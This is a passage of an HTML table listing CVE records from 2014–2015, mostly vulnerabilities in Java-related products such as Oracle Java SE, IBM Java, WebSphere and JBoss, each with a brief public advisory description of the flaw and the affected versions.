		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2278">CVE-2015-2278</a></td>
		<td valign="top">The LZH decompression implementation (CsObjectInt::BuildHufTree function in vpa108csulzh.cpp) in SAP MaxDB 7.5 and 7.6, Netweaver Application Server ABAP, Netweaver Application Server Java, Netweaver RFC SDK, GUI, RFC SDK, SAPCAR archive tool, and other products allows context-dependent attackers to cause a denial of service (out-of-bounds read) via unspecified vectors, related to look-ups of non-simple codes, aka SAP Security Note 2124806, 2121661, 2127995, and 2125316.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-1931">CVE-2015-1931</a></td>
		<td valign="top">IBM Java Security Components in IBM SDK, Java Technology Edition 8 before SR1 FP10, 7 R1 before SR3 FP10, 7 before SR9 FP10, 6 R1 before SR8 FP7, 6 before SR16 FP7, and 5.0 before SR16 FP13 stores plaintext information in memory dumps, which allows local users to obtain sensitive information by reading a file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-1916">CVE-2015-1916</a></td>
		<td valign="top">Unspecified vulnerability in IBM Java 8 before SR1 allows remote attackers to cause a denial of service via unknown vectors related to SSL/TLS and the Secure Socket Extension provider.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-1914">CVE-2015-1914</a></td>
		<td valign="top">IBM Java 7 R1 before SR3, 7 before SR9, 6 R1 before SR8 FP4, 6 before SR16 FP4, and 5.0 before SR16 FP10 allows remote attackers to bypass "permission checks" and obtain sensitive information via vectors related to the Java Virtual Machine.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-1887">CVE-2015-1887</a></td>
		<td valign="top">IBM WebSphere Portal 7.0.0 through 7.0.0.2 CF29, 8.0.0 before 8.0.0.1 CF17, and 8.5.0 before CF06 allows remote attackers to obtain sensitive Java Content Repository (JCR) information via a crafted request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-1882">CVE-2015-1882</a></td>
		<td valign="top">Multiple race conditions in IBM WebSphere Application Server (WAS) 8.5 Liberty Profile before 8.5.5.5 allow remote authenticated users to gain privileges by leveraging thread conflicts that result in Java code execution outside the context of the configured EJB Run-as user.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-1832">CVE-2015-1832</a></td>
		<td valign="top">XML external entity (XXE) vulnerability in the SqlXmlUtil code in Apache Derby before 10.12.1.1, when a Java Security Manager is not in place, allows context-dependent attackers to read arbitrary files or cause a denial of service (resource consumption) via vectors involving XmlVTI and the XML datatype.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-1796">CVE-2015-1796</a></td>
		<td valign="top">The PKIX trust engines in Shibboleth Identity Provider before 2.4.4 and OpenSAML Java (OpenSAML-J) before 2.6.5 trust candidate X.509 credentials when no trusted names are available for the entityID, which allows remote attackers to impersonate an entity via a certificate issued by a shibmd:KeyAuthority trust anchor.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-1261">CVE-2015-1261</a></td>
		<td valign="top">android/java/src/org/chromium/chrome/browser/WebsiteSettingsPopup.java in Google Chrome before 43.0.2357.65 on Android does not properly restrict use of a URL's fragment identifier during construction of a page-info popup, which allows remote attackers to spoof the URL bar or deliver misleading popup content via crafted text.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-10076">CVE-2015-10076</a></td>
		<td valign="top">A vulnerability was found in dimtion Shaarlier up to 1.2.2. It has been declared as critical. Affected by this vulnerability is the function createTag of the file app/src/main/java/com/dimtion/shaarlier/TagsSource.java of the component Tag Handler. The manipulation leads to sql injection. Upgrading to version 1.2.3 is able to address this issue. The identifier of the patch is 3d1d9b239d9b3cd87e8bed45a0f02da583ad371e. It is recommended to upgrade the affected component. The identifier VDB-220453 was assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-10061">CVE-2015-10061</a></td>
		<td valign="top">A vulnerability was found in evandro-machado Trabalho-Web2. It has been classified as critical. This affects an unknown part of the file src/java/br/com/magazine/dao/ClienteDAO.java. The manipulation leads to sql injection. The patch is named f59ac954625d0a4f6d34f069a2e26686a7a20aeb. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-218427.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0691">CVE-2015-0691</a></td>
		<td valign="top">A certain Cisco JAR file, as distributed in Cache Cleaner in Cisco Secure Desktop (CSD), allows remote attackers to execute arbitrary commands via a crafted web site, aka Bug ID CSCup83001.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0545">CVE-2015-0545</a></td>
		<td valign="top">EMC Unisphere for VMAX 8.x before 8.0.3.4 sets up the Java Debugging Wire Protocol (JDWP) service, which allows remote attackers to execute arbitrary code via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0492">CVE-2015-0492</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u76 and 8u40, and JavaFX 2.2.76, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2015-0484.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0491">CVE-2015-0491</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u81, 6u91, 7u76, and 8u40, and Java FX 2.2.76, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D, a different vulnerability than CVE-2015-0459.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0488">CVE-2015-0488</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u81, 6u91, 7u76, and 8u40, and JRockit R28.3.5, allows remote attackers to affect availability via vectors related to JSSE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0486">CVE-2015-0486</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u40 allows remote attackers to affect confidentiality via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0484">CVE-2015-0484</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u76 and 8u40, and Java FX 2.2.76, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2015-0492.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0480">CVE-2015-0480</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u81, 6u91, 7u76, and 8u40 allows remote attackers to affect integrity and availability via unknown vectors related to Tools.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0478">CVE-2015-0478</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u81, 6u91, 7u76, and 8u40, and JRockit R28.3.5, allows remote attackers to affect confidentiality via vectors related to JCE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0477">CVE-2015-0477</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u81, 6u91, 7u76, and 8u40 allows remote attackers to affect integrity via unknown vectors related to Beans.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0470">CVE-2015-0470</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u40 allows remote attackers to affect integrity via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0469">CVE-2015-0469</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u81, 6u91, 7u76, and 8u40 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0460">CVE-2015-0460</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u81, 6u91, 7u76, and 8u40 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0459">CVE-2015-0459</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u81, 6u91, 7u76, and 8u40, and JavaFX 2.2.76, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D, a different vulnerability than CVE-2015-0491.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0458">CVE-2015-0458</a></td>
		<td valign="top">Unspecified vulnerability in in Oracle Java SE 6u91, 7u76, and 8u40 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0457">CVE-2015-0457</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2015-2629.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0437">CVE-2015-0437</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u25 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0421">CVE-2015-0421</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u25 allows local users to affect confidentiality, integrity, and availability via unknown vectors related to the installation process.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0413">CVE-2015-0413</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u72 and 8u25 allows local users to affect integrity via unknown vectors related to Serviceability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0412">CVE-2015-0412</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u85, 7u72, and 8u25 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to JAX-WS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0410">CVE-2015-0410</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE, Java SE Embedded, JRockit component in Oracle Java SE 5.0u75, 6u85, 7u72, and 8u25; Java SE Embedded 7u71 and 8u6; and JRockit R27.8.4 and R28.3.4 allows remote attackers to affect availability via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0408">CVE-2015-0408</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u75, 6u85, 7u72, and 8u25 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to RMI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0407">CVE-2015-0407</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u75, 6u85, 7u72, and 8u25 allows remote attackers to affect confidentiality via unknown vectors related to Swing.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0406">CVE-2015-0406</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u85, 7u72, and 8u25 allows remote attackers to affect confidentiality and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0403">CVE-2015-0403</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u85, 7u72, and 8u25 allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0400">CVE-2015-0400</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u85, 7u72, and 8u25 allows remote attackers to affect confidentiality via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0395">CVE-2015-0395</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u75, 6u85, 7u72, and 8u25 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0383">CVE-2015-0383</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u75, 6u85, 7u72, and 8u25; Java SE Embedded 7u71 and 8u6; and JRockit R27.8.4 and R28.3.4 allows local users to affect integrity and availability via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0366">CVE-2015-0366</a></td>
		<td valign="top">Unspecified vulnerability in the Siebel Core - EAI component in Oracle Siebel CRM 8.1.1 and 8.2.2 allows remote attackers to affect confidentiality via unknown vectors related to Java Integration, a different vulnerability than CVE-2014-0369.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0297">CVE-2015-0297</a></td>
		<td valign="top">Red Hat JBoss Operations Network 3.3.1 does not properly restrict access to certain APIs, which allows remote attackers to execute arbitrary Java methods via the (1) ServerInvokerServlet or (2) SchedulerService or (3) cause a denial of service (disk consumption) via the ContentManager.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0284">CVE-2015-0284</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in spacewalk-java in Spacewalk and Red Hat Satellite 5.7 allows remote authenticated users to inject arbitrary web script or HTML via crafted XML data to the XMLRPC API, involving user details. NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-7811.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0279">CVE-2015-0279</a></td>
		<td valign="top">JBoss RichFaces before 4.5.4 allows remote attackers to inject expression language (EL) expressions and execute arbitrary Java code via the do parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0249">CVE-2015-0249</a></td>
		<td valign="top">The weblog page template in Apache Roller 5.1 through 5.1.1 allows remote authenticated users with admin privileges for a weblog to execute arbitrary Java code via crafted Velocity Text Language (aka VTL).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0225">CVE-2015-0225</a></td>
		<td valign="top">The default configuration in Apache Cassandra 1.2.0 through 1.2.19, 2.0.0 through 2.0.13, and 2.1.0 through 2.1.3 binds an unauthenticated JMX/RMI interface to all network interfaces, which allows remote attackers to execute arbitrary Java code via an RMI request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0201">CVE-2015-0201</a></td>
		<td valign="top">The Java SockJS client in Pivotal Spring Framework 4.1.x before 4.1.5 generates predictable session ids, which allows remote attackers to send messages to other sessions via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0192">CVE-2015-0192</a></td>
		<td valign="top">Unspecified vulnerability in IBM Java 8 before SR1, 7 R1 before SR2 FP11, 7 before SR9, 6 R1 before SR8 FP4, 6 before SR16 FP4, and 5.0 before SR16 FP10 allows remote attackers to gain privileges via unknown vectors related to the Java Virtual Machine.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-0178">CVE-2015-0178</a></td>
		<td valign="top">The Java overlay feature in IBM Bluemix Liberty before 1.13-20150209-1122 for Java does not properly support WAR applications, which allows remote attackers to obtain sensitive information via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-9757">CVE-2014-9757</a></td>
		<td valign="top">The Ignite Realtime Smack XMPP API, as used in Atlassian Bamboo before 5.9.9 and 5.10.x before 5.10.0, allows remote configured XMPP servers to execute arbitrary Java code via serialized data in an XMPP message.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-9199">CVE-2014-9199</a></td>
		<td valign="top">The Clorius Controls Java web client before 01.00.0009g allows remote attackers to discover credentials by sniffing the network for cleartext-equivalent traffic.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-8903">CVE-2014-8903</a></td>
		<td valign="top">IBM Curam Social Program Management 6.0 SP2 before EP26, 6.0.4 before 6.0.4.5iFix10 and 6.0.5 before 6.0.5.6 allows remote authenticated users to load arbitrary Java classes via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-8892">CVE-2014-8892</a></td>
		<td valign="top">Unspecified vulnerability in the Java Virtual Machine (JVM) in IBM SDK, Java Technology Edition 5.0 before SR16-FP9, 6 before SR16-FP3, 6R1 before SR8-FP3, 7 before SR8-FP10, and 7R1 before SR2-FP10 allows remote attackers to bypass intended access permissions and obtain sensitive information via unspecified vectors related to the security manager.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-8891">CVE-2014-8891</a></td>
		<td valign="top">Unspecified vulnerability in the Java Virtual Machine (JVM) in IBM SDK, Java Technology Edition 5.0 before SR16-FP9, 6 before SR16-FP3, 6R1 before SR8-FP3, 7 before SR8-FP10, and 7R1 before SR2-FP10 allows remote attackers to escape the Java sandbox and execute arbitrary code via unspecified vectors related to the security manager.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-8590">CVE-2014-8590</a></td>
		<td valign="top">XML external entity (XXE) vulnerability in the Web Service Navigator in SAP NetWeaver Application Server (AS) Java allows remote attackers to access arbitrary files via a crafted request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-8526">CVE-2014-8526</a></td>
		<td valign="top">McAfee Network Data Loss Prevention (NDLP) before 9.3 allows local users to obtain sensitive information by reading a Java stack trace.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-8162">CVE-2014-8162</a></td>
		<td valign="top">XML external entity (XXE) in the RPC interface in Spacewalk and Red Hat Network (RHN) Satellite 5.7 and earlier allows remote attackers to read arbitrary files and possibly have other unspecified impact via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-8152">CVE-2014-8152</a></td>
		<td valign="top">Apache Santuario XML Security for Java 2.0.x before 2.0.3 allows remote attackers to bypass the streaming XML signature protection mechanism via a crafted XML document.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-8120">CVE-2014-8120</a></td>
		<td valign="top">The agent in Thermostat before 1.0.6, when using unspecified configurations, allows local users to obtain the JMX management URLs of all local Java virtual machines and gain privileges via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-7911">CVE-2014-7911</a></td>
		<td valign="top">luni/src/main/java/java/io/ObjectInputStream.java in the java.io.ObjectInputStream implementation in Android before 5.0.0 does not verify that deserialization will result in an object that met the requirements for serialization, which allows attackers to execute arbitrary code via a crafted finalize method for a serialized object in an ArrayMap Parcel within an intent sent to system_service, as demonstrated by the finalize method of android.os.BinderProxy, aka Bug 15874291.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-7296">CVE-2014-7296</a></td>
		<td valign="top">The default configuration in the accessibility engine in SpagoBI 5.0.0 does not set FEATURE_SECURE_PROCESSING, which allows remote authenticated users to execute arbitrary Java code via a crafted XSL document.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-7241">CVE-2014-7241</a></td>
		<td valign="top">The TSUTAYA application 5.3 and earlier for Android allows remote attackers to execute arbitrary Java methods via a crafted HTML document.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6601">CVE-2014-6601</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u85, 7u72, and 8u25 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6593">CVE-2014-6593</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u75, 6u85, 7u72, and 8u25; Java SE Embedded 7u71 and 8u6; and JRockit 27.8.4 and 28.3.4 allows remote attackers to affect confidentiality and integrity via vectors related to JSSE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6591">CVE-2014-6591</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE component in Oracle Java SE 5.0u75, 6u85, 7u72, and 8u25 allows remote attackers to affect confidentiality via unknown vectors related to 2D, a different vulnerability than CVE-2014-6585.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6587">CVE-2014-6587</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u85, 7u72, and 8u25 allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6585">CVE-2014-6585</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u75, 6u85, 7u72, and 8u25 allows remote attackers to affect confidentiality via unknown vectors related to 2D, a different vulnerability than CVE-2014-6591.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6563">CVE-2014-6563</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality via unknown vectors, a different vulnerability than CVE-2014-4294, CVE-2014-4295, and CVE-2014-6538.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6562">CVE-2014-6562</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u20 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6560">CVE-2014-6560</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2014-6453, CVE-2014-6467, and CVE-2014-6545.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6558">CVE-2014-6558</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u71, 6u81, 7u67, and 8u20; Java SE Embedded 7u60; and JRockit R27.8.3 and JRockit R28.3.3 allows remote attackers to affect integrity via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6549">CVE-2014-6549</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u25 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6545">CVE-2014-6545</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2014-6453, CVE-2014-6467, and CVE-2014-6560.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6538">CVE-2014-6538</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality via unknown vectors, a different vulnerability than CVE-2014-4294, CVE-2014-4295, and CVE-2014-6563.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6537">CVE-2014-6537</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6532">CVE-2014-6532</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u81, 7u67, and 8u20 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2014-4288, CVE-2014-6493, and CVE-2014-6503.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6531">CVE-2014-6531</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u71, 6u81, 7u67, and 8u20, and Java SE Embedded 7u60, allows remote attackers to affect confidentiality via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6527">CVE-2014-6527</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u67 and 8u20 allows remote attackers to affect integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2014-6476.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6519">CVE-2014-6519</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u67 and 8u20, and Java SE Embedded 7u60, allows remote attackers to affect integrity via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6517">CVE-2014-6517</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u81, 7u67, and 8u20; Java SE Embedded 7u60; and Jrockit R27.8.3 and R28.3.3 allows remote attackers to affect confidentiality via vectors related to JAXP.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6515">CVE-2014-6515</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u81, 7u67, and 8u20 allows remote attackers to affect integrity via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6513">CVE-2014-6513</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u81, 7u67, and 8u20, and Java SE Embedded 7u60, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to AWT.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2014-6512">CVE-2014-6512</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u71, 6u81, 7u67, and 8u20; Java SE Embedded 7u60; and JRockit R27.8.3 and R28.3.3 allows remote attackers to affect integrity via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
